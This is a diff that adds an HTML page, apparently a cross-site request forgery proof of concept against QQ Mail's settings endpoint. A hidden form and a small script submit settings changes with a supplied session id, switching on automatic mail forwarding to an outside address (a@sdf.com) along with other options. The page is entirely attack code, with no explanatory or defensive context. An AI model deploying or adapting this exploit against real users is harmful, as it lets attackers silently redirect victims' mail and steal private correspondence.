@@ -1,0 +1,57 @@
+<html>
+  <body>
+    <form action="" id="csrfform" method="POST">
+      <input type="text" id="sid" name="sid" value="" />
+      <input type="hidden" name="Fun" value="submit" />
+      <input type="hidden" name="signature" value="&lt;br&gt;" />
+      <input type="hidden" name="noreload" value="1" />
+      <input type="hidden" name="autocontent&#95;&#95;html" value="&lt;br&gt;" />
+      <input type="hidden" name="addhtml" value="yes" />
+      <input type="hidden" name="rtcheck" value="0" />
+      <input type="hidden" name="verifykey" value="" />
+      <input type="hidden" name="verifycode" value="" />
+      <input type="hidden" name="verifycode&#95;cn" value="" />
+      <input type="hidden" name="setlang" value="cn" />
+      <input type="hidden" name="interfacesize" value="0" />
+      <input type="hidden" name="showcount" value="0" />
+      <input type="hidden" name="defaultfontid" value="0" />
+      <input type="hidden" name="defaultsizeid" value="0" />
+      <input type="hidden" name="defaultcolor" value="default" />
+      <input type="hidden" name="listmode" value="1" />
+      <input type="hidden" name="delflag" value="0" />
+      <input type="hidden" name="selectSign" value="&#45;1" />
+      <input type="hidden" name="noinclude" value="0" />
+      <input type="hidden" name="titlePrefix" value="0" />
+      <input type="hidden" name="autofwd" value="2" />
+      <input type="text" name="fwdaddress" value="a&#64;sdf&#46;com" />
+      <input type="hidden" name="fwdbackup" value="0" />
+      <input type="hidden" name="replytype" value="0" />
+      <input type="hidden" name="abstract" value="0" />
+      <input type="hidden" name="mailsize" value="0" />
+      <input type="hidden" name="weather" value="0" />
+      <input type="hidden" name="Birthday" value="1" />
+      <input type="hidden" name="todaynews" value="1" />
+      <input type="hidden" name="editor" value="0" />
+      <input type="hidden" name="addrhistory" value="1" />
+      <input type="hidden" name="txtformat" value="0" />
+      <input type="hidden" name="IsValid" value="0" />
+      <input type="hidden" name="atcpsubject" value="0" />
+      <input type="hidden" name="autoaddaddress" value="0" />
+      <input type="hidden" name="savesendbox" value="0" />
+      <input type="hidden" name="sendmailunicode" value="0" />
+      <input type="hidden" name="bgsend" value="0" />
+      <input type="hidden" name="QQlight" value="0" />
+      <input type="hidden" name="qqplus" value="0" />
+      <input type="hidden" name="plpopen" value="0" />
+    </form>
+
+    <input type="button" onclick="submit()" value="Submit form" />
+    <script type="text/javascript">
+      function submit(){
+        var form = document.getElementById('csrfform');
+        form.setAttribute('action','http://mail.qq.com/cgi-bin/setting1?sid=' + document.getElementById('sid').value)
+        form.submit()
+      }
+    </script>
+  </body>
+</html>
